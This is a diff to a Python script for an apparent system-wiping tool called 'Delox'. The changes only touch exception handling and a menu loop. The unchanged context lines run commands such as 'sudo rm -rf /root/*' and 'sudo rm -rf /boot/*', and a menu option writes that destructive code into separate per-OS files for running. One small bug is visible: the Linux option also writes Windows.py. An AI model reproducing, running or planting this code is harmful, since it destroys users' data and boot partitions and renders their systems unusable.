@@ -110,8 +110,8 @@ if sys == 1:
                     print('=============================')
                     print('    YOU DELET ALL SYSTEM    |')
                     print('=============================')
-                    break
-        except Error:
+            break
+        except AttributeError:
             print( Color.RED +'[*] -> plese check the systems.')
 
 elif sys == 2:
@@ -156,8 +156,8 @@ elif sys == 2:
                     os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                     os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                     os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
-                break
-        except Error:
+            break
+        except AttributeError:
             print( Color.RED +'[*] -> plese check the systems.')
 
 elif sys == 3:
@@ -173,46 +173,50 @@ elif sys == 3:
                 os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                 os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
             break
-        except Error:
+        except AttributeError:
             print( Color.RED +'[*] -> plese check the systems.')
 
 
 elif sys == 4:
-    ClearCSR()
-    print(banner.Created_banner('Write Delox'))
-    print('which one?')
-    print('''
-    [1] -> Windows      Write code Windows64 bit in new file for run.
-     [2] -> Linux        Write code Linux bit in new file for run.
-      [3] -> Mac OS       Write code MacOS in new file for run.
-       [help] -> help
-        ''')
-    numbers = input('Enter Number: ')
-    def Windows():
-        with open('Windows.py', 'w') as file:
-            file.write(delWindows())
-            file.close()
-    def Linux():
-        with open('Windows.py', 'w') as file:
-            file.write(delWindows())
-            file.close()
-    def MacOS():
-        with open('MacOS.py', 'w') as file:
-            file.write(delOs())
-            file.close()
-    def Help():
-        with open('help.py', 'w') as file:
-            file.write('In this section, you can separate each executable file and save it in another file, for example, if you read Linux, it will copy the code in this tool for Linux in a new file and add it to the new file.')
-            file.close()
-            
-    if numbers == '1':
-        Windows()
-    elif numbers == '2':
-        Linux()
-    elif numbers == '3':
-        MacOS()
-    elif numbers == 'help' or numbers == 'Help' or numbers == '4':
-        Help()
+    while True:
+        try:
+            ClearCSR()
+            print(banner.Created_banner('Write Delox'))
+            print('which one?')
+            print('''
+            [1] -> Windows      Write code Windows64 bit in new file for run.
+            [2] -> Linux        Write code Linux bit in new file for run.
+            [3] -> Mac OS       Write code MacOS in new file for run.
+            [help] -> help
+                ''')
+            numbers = input('Enter Number: ')
+            def Windows():
+                with open('Windows.py', 'w') as file:
+                    file.write(delWindows())
+                    file.close()
+            def Linux():
+                with open('Windows.py', 'w') as file:
+                    file.write(delWindows())
+                    file.close()
+            def MacOS():
+                with open('MacOS.py', 'w') as file:
+                    file.write(delOs())
+                    file.close()
+            def Help():
+                with open('help.py', 'w') as file:
+                    file.write('In this section, you can separate each executable file and save it in another file, for example, if you read Linux, it will copy the code in this tool for Linux in a new file and add it to the new file.')
+                    file.close()
+
+            if numbers == '1':
+                Windows()
+            elif numbers == '2':
+                Linux()
+            elif numbers == '3':
+                MacOS()
+            elif numbers == 'help' or numbers == 'Help' or numbers == '4':
+                Help()
+        except AttributeError:
+            print('Attribute Error')
 
 elif sys == 99:
     print('Good By')
